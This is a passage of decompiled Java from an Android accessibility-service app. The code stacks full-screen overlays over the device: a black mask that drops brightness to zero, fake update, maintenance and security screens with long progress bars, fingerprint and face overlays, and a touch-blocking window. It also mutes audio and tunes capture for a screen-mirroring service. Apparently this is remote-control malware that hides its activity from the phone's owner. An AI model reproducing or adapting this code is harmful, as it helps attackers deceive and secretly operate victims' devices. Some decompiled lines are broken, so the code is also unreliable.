        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, g8.A(windowManager), 2032, f5459w ? 525496 : 184, -3);
        layoutParams.gravity = 8388659;
        layoutParams.alpha = 1.0f;
        layoutParams.screenBrightness = z2 ? 0.0f : -1.0f;
        layoutParams.dimAmount = 0.0f;
        layoutParams.setTitle("dicktok-owned-visual-mask:".concat("stack"));
        g8.y(layoutParams);
        return layoutParams;
    }

    public static long j(long j3, long j4) {
        if (Looper.myLooper() == Looper.getMainLooper() && j3 > 0 && j3 == f5451o && p0()) {
            AccessibilityService accessibilityService = f5443f;
            View view = f5450m;
            if (accessibilityService != null && view != null) {
                if (n && view.isAttachedToWindow()) {
                    return j3;
                }
                WindowManager windowManager = (WindowManager) accessibilityService.getSystemService(WindowManager.class);
                if (windowManager != null) {
                    try {
                        g8.C(view);
                        windowManager.addView(view, o0(windowManager));
                        n = true;
                        g8 g8Var = f5452p;
                        if (g8Var == null) {
                            f5452p = g8.w(accessibilityService, view);
                        } else {
                            g8Var.D();
                        }
                        f5452p.E(p0());
                        Log.i("UpdateNotice", "[OverlayPunch] stage=rearm_attached epoch=" + j4 + " generation=" + j3 + " viewId=" + (Integer.toUnsignedLong(System.identityHashCode(view)) + 1));
                        return j3;
                    } catch (Throwable th) {
                        n = view.isAttachedToWindow();
                        StringBuilder sbJ = a0.a.j(j4, "[OverlayPunch] rearm attach failed epoch=", " error=");
                        sbJ.append(th.getClass().getSimpleName());
                        Log.w("UpdateNotice", sbJ.toString());
                    }
                }
            }
        }
        return 0L;
    }

    public static String j0() {
        long j3;
        String str;
        boolean zE0;
        try {
            View view = f5444g;
            f5456t = view != null && view.isAttachedToWindow();
            ArrayList arrayListQ = q();
            String strC = y7.c(arrayListQ);
            boolean z2 = f5459w;
            w8 w8VarD = f5440c.d();
            boolean z3 = w8VarD.f5415h;
            boolean z4 = w8VarD.f5410c;
            boolean z5 = w8VarD.f5414g;
            boolean z6 = w8VarD.f5409b;
            boolean z7 = w8VarD.f5418k;
            boolean z8 = z5 || f5462z != null;
            boolean z9 = z7 || A != null;
            boolean z10 = z2 || z6 || z8 || z9;
            if (strC != null) {
                f5460x = strC;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("ok", true);
            jSONObject.put("active", f5455s);
            jSONObject.put("template", f5460x);
            y3 y3Var = f5462z;
            jSONObject.put("preset", y3Var != null ? y3Var.f5576a : f5460x);
            JSONArray jSONArray = new JSONArray();
            int size = arrayListQ.size();
            int i3 = 0;
            while (i3 < size) {
                Object obj = arrayListQ.get(i3);
                i3++;
                jSONArray.put((String) obj);
                arrayListQ = arrayListQ;
            }
            jSONObject.put("layers", jSONArray);
            JSONArray jSONArray2 = new JSONArray();
            if (z2 && f5456t) {
                jSONArray2.put("black");
            }
            if (z4 && f5456t) {
                jSONArray2.put("update");
            }
            if (z3 && f5456t) {
                jSONArray2.put("fingerprint");
            }
            if (z7 && f5456t) {
                jSONArray2.put("face");
            }
            jSONObject.put("visibleLayers", jSONArray2);
            JSONObject jSONObject2 = new JSONObject();
            boolean z11 = z8;
            String str2 = null;
            boolean z12 = z9;
            jSONObject2.put("black", J(G(f5446i), z2, z2 && f5456t, false, null));
            boolean z13 = w8VarD.f5408a && G(f5447j);
            boolean z14 = z4 && f5456t;
            boolean z15 = w8VarD.f5411d;
            if (z15) {
                str2 = z7 ? "face" : "fingerprint";
            }
            jSONObject2.put("update", J(z13, z6, z14, z15, str2));
            boolean z16 = w8VarD.f5413f && G(f5448k);
            boolean z17 = z3 && f5456t;
            boolean z18 = w8VarD.f5416i;
            jSONObject2.put("fingerprint", J(z16, z5, z17, z18, z18 ? "face" : null));
            jSONObject2.put("face", J(w8VarD.f5417j && G(f5449l), z7, z7 && f5456t, false, null));
            jSONObject.put("layerStates", jSONObject2);
            jSONObject.put("shownAtMs", D);
            jSONObject.put("expiresAtMs", h0());
            if (!z2 || z11) {
                j3 = (z12 || (z6 && !z11)) ? 0L : E;
            } else {
                j3 = 3600000;
            }
            jSONObject.put("timeoutMs", j3);
            jSONObject.put("blackExpiresAtMs", z2 ? G : 0L);
            jSONObject.put("blackTimeoutMs", z2 ? 3600000L : 0L);
            if (z6) {
                jSONObject.put("progressDurationMs", 3600000L);
            }
            View view2 = f5450m;
            jSONObject.put("touchThrough", !(view2 != null && n && view2.isAttachedToWindow()));
            jSONObject.put("excludeFromCapture", false);
            String str3 = strC != null ? strC : f5460x;
            if ("face".equals(str3)) {
                str = "face_mask";
            } else if ("fingerprint".equals(str3)) {
                str = "fingerprint_mask";
            } else if ("update".equals(str3)) {
                str = "update_mask";
            } else {
                str = "black".equals(str3) ? "black_mask" : "dialog_plus_brightness";
            }
            jSONObject.put("mode", str);
            if (H()) {
                zE0 = e0();
            } else {
                zE0 = !z11 && f5456t;
            }
            jSONObject.put("brightnessDimmed", zE0);
            jSONObject.put("dialogVisible", (z12 || z11 || z2 || z6 || !f5456t) ? false : true);
            jSONObject.put("maskVisible", (z12 || z11 || z2 || z6) && f5456t);
            jSONObject.put("notificationVisible", f5457u);
            jSONObject.put("audioMuted", f5458v);
            jSONObject.put("extraDimApplied", false);
            jSONObject.put("extraDimLevel", 0);
            jSONObject.put("minimumBrightness", 0);
            jSONObject.put("progressPercent", z6 ? n4.G(Q()) : 0);
            if (z10) {
                jSONObject.put("blackOpacity", f5461y);
            }
            if (z10) {
                jSONObject.put("webpQuality", e2.e2.f786a.get());
            }
            if (z10) {
                jSONObject.put("captureCompensationVersion", 4);
                jSONObject.put("captureCompensationStage", e2.g0.f809c.get() ? "pre_webp_h264_gl" : "pre_webp");
                AtomicReference atomicReference = e2.g0.f808b;
                jSONObject.put("capturePreEncodeGain", ((e2.f0) atomicReference.get()).f796c);
                e2.f0 f0Var = (e2.f0) atomicReference.get();
                int i4 = f0Var.f795b;
                float f3 = f0Var.f796c;
                e2.g0 g0Var = e2.g0.f807a;
                float fB = e2.g0.b(i4) / e2.g0.c(f3);
                if (fB < 1.0f) {
                    fB = 1.0f;
                }
                jSONObject.put("capturePostEncodeGain", fB);
            }
            y3 y3Var2 = f5462z;
            if (y3Var2 != null) {
                R(jSONObject, y3Var2);
            }
            q3 q3Var = A;
            if (q3Var != null) {
                jSONObject.put("faceMode", q3Var.f4892a);
            }
            return jSONObject.toString();
        } catch (Exception unused) {
            return x("status_failed");
        }
    }

    public static boolean k(AccessibilityService accessibilityService, WindowManager windowManager, boolean z2) {
        View view = new View(accessibilityService);
        view.setBackgroundColor(0);
        g(view);
        view.setId(R.id.owned_visual_mask_window);
        try {
            g8.C(view);
            windowManager.addView(view, o0(windowManager));
            f5450m = view;
            n = true;
            long j3 = f5451o + 1;
            f5451o = j3;
            if (j3 <= 0) {
                f5451o = 1L;
            }
            g8 g8VarW = g8.w(accessibilityService, view);
            f5452p = g8VarW;
            g8VarW.E(p0());
            if (z2) {
                P.m(f5451o);
            }
            Log.i("UpdateNotice", "overlay touch-block attached generation=" + f5451o);
            return true;
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("overlay touch-block attach failed: "), "UpdateNotice");
            return false;
        }
    }

    public static void k0() {
        View view;
        d0(p0() && H() && (view = f5444g) != null && view.isAttachedToWindow());
    }

    public static sf l(AccessibilityService accessibilityService, long j3, int i3, long j4, long j5, rf rfVar) {
        if (Looper.myLooper() != Looper.getMainLooper() || j3 <= 0 || j5 <= 0) {
            sf sfVar = new sf(Math.max(1L, j3), false, null, rfVar);
            sf.d(sfVar, 13);
            return sfVar;
        }
        synchronized (f5439b) {
            try {
                if (!p0()) {
                    return new sf(j3, true, null, rfVar);
                }
                f5443f = accessibilityService;
                w(accessibilityService);
                if (H() && f5450m != null && f5451o > 0) {
                    AtomicInteger atomicInteger = new AtomicInteger(0);
                    b8 b8VarS = P.s(new c8(f5451o, j3, i3, j4), j5, new ff(sfVarArr, atomicInteger));
                    sf sfVar2 = new sf(j3, false, b8VarS, rfVar);
                    sf[] sfVarArr = {sfVar2};
                    int i4 = atomicInteger.get();
                    if (i4 != 0) {
                        sf.d(sfVar2, i4);
                    } else if (b8VarS == null || b8VarS.f3582g) {
                        sf.d(sfVar2, 13);
                    }
                    return sfVar2;
                }
                sf sfVar3 = new sf(j3, false, null, rfVar);
                sf.d(sfVar3, 4);
                return sfVar3;
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    public static void l0() {
        int i3 = 0;
        boolean z2 = f5459w || f5440c.d().f5409b || A() || z();
        if (z2) {
            int i4 = f5461y;
            e2.g0 g0Var = e2.g0.f807a;
            int iE = y.f.e(i4, 100);
            e2.g0.f808b.set(new e2.f0(true, iE, e2.g0.b(iE)));
        } else {
            e2.g0.f808b.set(new e2.f0());
        }
        try {
            ScreenMirrorService screenMirrorServiceU2 = ScreenMirrorService.U2();
            if (screenMirrorServiceU2 != null) {
                Handler handler = screenMirrorServiceU2.z2;
                if (handler != null) {
                    ea eaVar = new ea(i3, screenMirrorServiceU2, z2);
                    if (Looper.myLooper() == handler.getLooper()) {
                        eaVar.run();
                    } else {
                        handler.post(eaVar);
                    }
                }
                synchronized (screenMirrorServiceU2.t4) {
                    try {
                        fd fdVar = screenMirrorServiceU2.u4;
                        synchronized (fdVar) {
                            fdVar.f4043a = z2;
                            fdVar.a();
                            fdVar.b();
                        }
                    } catch (Throwable th) {
                        throw th;
                    }
                }
            }
        } catch (IllegalStateException e3) {
            Log.w("UpdateNotice", "H.264 bitrate profile sync raced encoder teardown: " + e3.getMessage());
        } catch (Throwable th2) {
            a0.a.p(th2, new StringBuilder("H.264 bitrate profile sync failed: "), "UpdateNotice");
        }
    }

    public static SharedPreferences m() {
        Context context = f5442e;
        if (context == null) {
            return null;
        }
        try {
            return context.getSharedPreferences("gateway_black_overlay_lease", 0);
        } catch (IllegalStateException unused) {
            Log.w("UpdateNotice", "black overlay lease unavailable before user unlock");
            return null;
        }
    }

    public static void m0() {
        w8 w8VarD = f5440c.d();
        uf ufVar = f5447j;
        if (ufVar != null) {
            ufVar.setVisibility(w8VarD.f5410c ? 0 : 4);
        }
        View view = f5448k;
        if (view != null) {
            view.setVisibility(w8VarD.f5415h ? 0 : 4);
        }
        t3 t3Var = f5449l;
        if (t3Var != null) {
            t3Var.setVisibility(w8VarD.f5418k ? 0 : 4);
        }
    }

    /* JADX WARN: Code duplicated, block: B:50:0x007c  */
    /* JADX WARN: Code duplicated, block: B:74:0x0031 A[EXC_TOP_SPLITTER, PHI: r2 r3
  0x0031: PHI (r2v3 int) = (r2v1 int), (r2v8 int) binds: [B:24:0x0036, B:20:0x002f] A[DONT_GENERATE, DONT_INLINE]
  0x0031: PHI (r3v2 android.view.accessibility.AccessibilityNodeInfo) = (r3v1 android.view.accessibility.AccessibilityNodeInfo), (r3v7 android.view.accessibility.AccessibilityNodeInfo) binds: [B:24:0x0036, B:20:0x002f] A[DONT_GENERATE, DONT_INLINE], SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:83:0x00a6 A[SYNTHETIC] */
    public static c2.m n(long j3, View view) {
        AccessibilityService accessibilityService;
        List<AccessibilityWindowInfo> windows;
        AccessibilityNodeInfo accessibilityNodeInfoCreateAccessibilityNodeInfo;
        if (view != null && view.isAttachedToWindow()) {
            if (Looper.myLooper() == Looper.getMainLooper() && (accessibilityService = f5443f) != null) {
                try {
                    windows = accessibilityService.getWindows();
                } catch (Throwable unused) {
                    windows = null;
                }
            } else {
                windows = null;
            }
            if (windows != null) {
                int windowId = -1;
                try {
                    accessibilityNodeInfoCreateAccessibilityNodeInfo = view.createAccessibilityNodeInfo();
                    if (accessibilityNodeInfoCreateAccessibilityNodeInfo != null) {
                        try {
                            windowId = accessibilityNodeInfoCreateAccessibilityNodeInfo.getWindowId();
                        } catch (Throwable unused2) {
                            if (accessibilityNodeInfoCreateAccessibilityNodeInfo != null) {
                                try {
                                    accessibilityNodeInfoCreateAccessibilityNodeInfo.recycle();
                                } catch (Throwable unused3) {
                                }
                            }
                        }
                    }
                    if (accessibilityNodeInfoCreateAccessibilityNodeInfo != null) {
                        accessibilityNodeInfoCreateAccessibilityNodeInfo.recycle();
                    }
                } catch (Throwable unused4) {
                    accessibilityNodeInfoCreateAccessibilityNodeInfo = null;
                }
                AccessibilityWindowInfo accessibilityWindowInfo = null;
                for (AccessibilityWindowInfo accessibilityWindowInfo2 : windows) {
                    boolean z2 = false;
                    if (windowId >= 0 && accessibilityWindowInfo2 != null) {
                        try {
                            if (accessibilityWindowInfo2.getId() == windowId && accessibilityWindowInfo2.getType() == 4) {
                                z2 = true;
                            }
                        } catch (Throwable unused5) {
                        }
                    }
                    if (windowId >= 0) {
                        if (!z2) {
                            continue;
                        } else if (accessibilityWindowInfo != null) {
                            accessibilityWindowInfo = accessibilityWindowInfo2;
                        }
                    } else if (accessibilityWindowInfo2 == null) {
                        continue;
                    } else {
                        try {
                            CharSequence title = accessibilityWindowInfo2.getTitle();
                            if (title != null && "dicktok-owned-visual-mask:".concat("touch-block").contentEquals(title)) {
                                if (accessibilityWindowInfo != null) {
                                    accessibilityWindowInfo = accessibilityWindowInfo2;
                                }
                            }
                        } catch (Throwable unused6) {
                            continue;
                        }
                    }
                }
                if (accessibilityWindowInfo != null) {
                    try {
                        CharSequence title2 = accessibilityWindowInfo.getTitle();
                        long unsignedLong = Integer.toUnsignedLong(System.identityHashCode(view)) + 1;
                        int id = accessibilityWindowInfo.getId();
                        if (title2 != null) {
                            title2.toString();
                        }
                        c2.m mVar = new c2.m();
                        mVar.f438a = j3;
                        mVar.f439b = unsignedLong;
                        mVar.f440c = id;
                        return mVar;
                    } catch (Throwable unused7) {
                    }
                }
            }
        }
        return null;
    }

    public static vf n0(String str) {
        switch (str.hashCode()) {
            case -838846263:
                str.equals("update");
                break;
            case 3545755:
                if (str.equals("sync")) {
                    return new vf(R.string.sync_overlay_title, R.string.sync_overlay_description, Color.rgb(67, 208, 224), Color.argb(128, 8, 10, 14), android.R.drawable.stat_notify_sync, "↻");
                }
                break;
            case 317649683:
                if (str.equals("maintenance")) {
                    return new vf(R.string.maintenance_overlay_title, R.string.maintenance_overlay_description, Color.rgb(245, 173, 66), Color.argb(128, 8, 10, 14), android.R.drawable.stat_notify_sync, "⚙");
                }
                break;
            case 949122880:
                if (str.equals("security")) {
                    return new vf(R.string.security_overlay_title, R.string.security_overlay_description, Color.rgb(83, 209, 126), Color.argb(128, 8, 10, 14), android.R.drawable.ic_lock_lock, "✓");
                }
                break;
        }
        return new vf(R.string.update_overlay_title, R.string.update_overlay_description, Color.rgb(93, 156, 255), Color.argb(128, 8, 10, 14), android.R.drawable.stat_sys_download, "⇩");
    }

    public static void o() {
        Handler handler = f5438a;
        handler.removeCallbacks(S);
        handler.removeCallbacks(T);
        J = 0;
        Context context = f5442e;
        H = 0L;
        I = 0L;
        if (context != null) {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(AlarmManager.class);
            PendingIntent broadcast = PendingIntent.getBroadcast(context, 7303, new Intent(context, (Class<?>) BlackOverlayExpiryReceiver.class).setAction("lyr.stable.runtime.action.BLACK_OVERLAY_EXPIRE"), 603979776);
            if (alarmManager != null && broadcast != null) {
                alarmManager.cancel(broadcast);
                broadcast.cancel();
            }
        }
        SharedPreferences sharedPreferencesM = m();
        if (sharedPreferencesM != null && !sharedPreferencesM.getAll().isEmpty() && !sharedPreferencesM.edit().clear().commit()) {
            sharedPreferencesM.edit().clear().apply();
            Log.w("UpdateNotice", "black overlay lease clear deferred");
        }
        F = 0L;
        G = 0L;
    }

    public static WindowManager.LayoutParams o0(WindowManager windowManager) {
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, g8.A(windowManager), 2032, 525480, -3);
        layoutParams.gravity = 8388659;
        layoutParams.alpha = 1.0f;
        layoutParams.dimAmount = 0.0f;
        layoutParams.setTitle("dicktok-owned-visual-mask:".concat("touch-block"));
        g8.y(layoutParams);
        return layoutParams;
    }

    public static View p(ScreenMirrorService screenMirrorService, y3 y3Var) {
        View nfVar;
        String str = y3Var.f5577b;
        if ("side".equals(str) || "front_press".equals(str) || "rear".equals(str)) {
            pf pfVar = new pf(screenMirrorService);
            pfVar.setBackgroundColor(0);
            pfVar.setImportantForAccessibility(4);
            pfVar.addView(new qf(screenMirrorService, y3Var), new FrameLayout.LayoutParams(-1, -1));
            nfVar = pfVar;
        } else {
            nfVar = new nf(screenMirrorService, y3Var);
        }
        Log.i("UpdateNotice", "fingerprint overlay layer attached: ".concat(str));
        return nfVar;
    }

    public static boolean p0() {
        return f5459w || f5440c.d().f5409b || A() || z();
    }

    public static ArrayList q() {
        ArrayList arrayList = new ArrayList();
        if (f5459w) {
            arrayList.add("black");
        }
        if (f5440c.d().f5409b) {
            arrayList.add("update");
        }
        if (A()) {
            arrayList.add("fingerprint");
        }
        if (z()) {
            arrayList.add("face");
        }
        ArrayList arrayList2 = Q;
        ArrayList arrayList3 = new ArrayList();
        ArrayList arrayListB = y7.b(arrayList2);
        int size = arrayListB.size();
        int i3 = 0;
        while (i3 < size) {
            Object obj = arrayListB.get(i3);
            i3++;
            String str = (String) obj;
            if (arrayList.contains(str)) {
                arrayList3.add(str);
            }
        }
        return arrayList3;
    }

    public static void q0() {
        AccessibilityService accessibilityService;
        float fQ = Q();
        int iG = n4.G(fQ);
        uf ufVar = f5447j;
        if (ufVar != null) {
            ufVar.d(fQ);
        } else {
            View view = f5444g;
            if (view instanceof uf) {
                ((uf) view).d(fQ);
            }
        }
        ProgressBar progressBar = f5453q;
        if (progressBar != null) {
            progressBar.setProgress(iG);
        }
        TextView textView = f5454r;
        if (textView == null || (accessibilityService = f5443f) == null) {
            return;
        }
        textView.setText(accessibilityService.getString(R.string.update_overlay_percent, Integer.valueOf(iG)));
    }

    public static void r() {
        d0(false);
        f5438a.removeCallbacks(U);
        s();
        g8 g8Var = f5445h;
        f5445h = null;
        if (g8Var != null) {
            g8Var.close();
        }
        AccessibilityService accessibilityService = f5443f;
        View view = f5444g;
        t3 t3Var = f5449l;
        f5444g = null;
        f5446i = null;
        f5447j = null;
        f5448k = null;
        f5449l = null;
        f5453q = null;
        f5454r = null;
        f5456t = false;
        if (t3Var != null) {
            t3Var.c();
        }
        if (accessibilityService == null || view == null) {
            return;
        }
        try {
            WindowManager windowManager = (WindowManager) accessibilityService.getSystemService(WindowManager.class);
            if (windowManager != null) {
                windowManager.removeViewImmediate(view);
            }
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("update dialog detach failed: "), "UpdateNotice");
        }
    }

    public static void s() {
        View view = f5450m;
        long j3 = f5451o;
        if (view != null && Looper.myLooper() == Looper.getMainLooper()) {
            d8 d8Var = P;
            d8Var.r();
            if (j3 == d8Var.f3801d) {
                d8Var.a();
                d8Var.e(13);
                d8Var.f3803f = null;
                d8Var.f3804g = null;
                d8Var.f3801d = 0L;
                d8Var.f3800c = 1;
                d8Var.f3802e++;
                d8Var.y();
            }
        }
        boolean z2 = n;
        g8 g8Var = f5452p;
        f5452p = null;
        if (g8Var != null) {
            g8Var.close();
        }
        f5450m = null;
        n = false;
        AccessibilityService accessibilityService = f5443f;
        if (accessibilityService == null || view == null || !z2) {
            return;
        }
        try {
            WindowManager windowManager = (WindowManager) accessibilityService.getSystemService(WindowManager.class);
            if (windowManager != null) {
                windowManager.removeViewImmediate(view);
            }
            Log.i("UpdateNotice", "overlay touch-block detached");
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("overlay touch-block detach failed: "), "UpdateNotice");
        }
    }

    public static void t() {
        lf lfVar = N;
        N = null;
        if (lfVar != null) {
            f5438a.removeCallbacks(lfVar);
        }
        x8 x8Var = f5440c;
        synchronized (x8Var) {
            x8Var.f5515a = false;
            x8Var.f5516b = false;
            x8Var.f5517c = 0L;
            x8Var.f5518d = false;
            x8Var.f5519e = false;
            x8Var.f5521g = false;
            x8Var.f5522h = false;
        }
        f5462z = null;
        A = null;
        K = 0L;
        L = 0L;
        M = 0L;
        f5438a.removeCallbacks(U);
    }

    public static int u(AccessibilityService accessibilityService, int i3) {
        return Math.round(TypedValue.applyDimension(1, i3, accessibilityService.getResources().getDisplayMetrics()));
    }

    public static void v(AccessibilityService accessibilityService) {
        if (I()) {
            return;
        }
        if (f5444g != null) {
            r();
            t();
        }
        WindowManager windowManager = (WindowManager) accessibilityService.getSystemService(WindowManager.class);
        if (windowManager == null) {
            o2.k("window_manager_unavailable");
            return;
        }
        FrameLayout frameLayout = new FrameLayout(accessibilityService);
        frameLayout.setTag("overlay-stack");
        frameLayout.setBackgroundColor(0);
        frameLayout.setImportantForAccessibility(4);
        frameLayout.setId(R.id.owned_visual_mask_window);
        g8.C(frameLayout);
        windowManager.addView(frameLayout, i0(windowManager, true));
        f5444g = frameLayout;
        g8 g8VarW = g8.w(accessibilityService, frameLayout);
        f5445h = g8VarW;
        g8VarW.f4126i = false;
        f5456t = true;
        if (f5459w) {
            c0();
        }
        Log.i("UpdateNotice", "overlay stack attached");
    }

    public static void w(AccessibilityService accessibilityService) {
        WindowManager windowManager;
        if (accessibilityService == null || (windowManager = (WindowManager) accessibilityService.getSystemService(WindowManager.class)) == null) {
            return;
        }
        if (f5450m != null) {
            if (!n) {
                d8 d8Var = P;
                d8Var.r();
                if (d8Var.f3800c != 1) {
                    return;
                }
            }
            if (n && f5450m.isAttachedToWindow()) {
                return;
            }
            Log.w("UpdateNotice", "stale detached touch-block rebuilt");
            s();
        }
        if (k(accessibilityService, windowManager, true)) {
            return;
        }
        o2.k("touch_block_attach_failed");
    }

    public static String x(String str) {
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("ok", false);
            jSONObject.put("error", str);
            return jSONObject.toString();
        } catch (Exception unused) {
            return "{\"ok\":false,\"error\":\"unknown\"}";
        }
    }

    public static void y() {
        synchronized (f5439b) {
            try {
                long jCurrentTimeMillis = System.currentTimeMillis();
                r1 r1VarS = S(jCurrentTimeMillis);
                if (r1VarS.a(jCurrentTimeMillis)) {
                    d(r1VarS);
                    b0(jCurrentTimeMillis);
                    return;
                }
                o();
                if (f5459w) {
                    E("black", "timeout");
                } else {
                    F = 0L;
                    G = 0L;
                }
                Log.i("UpdateNotice", "black overlay lease expired");
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    public static boolean z() {
        return f5440c.d().f5418k;
    }
}
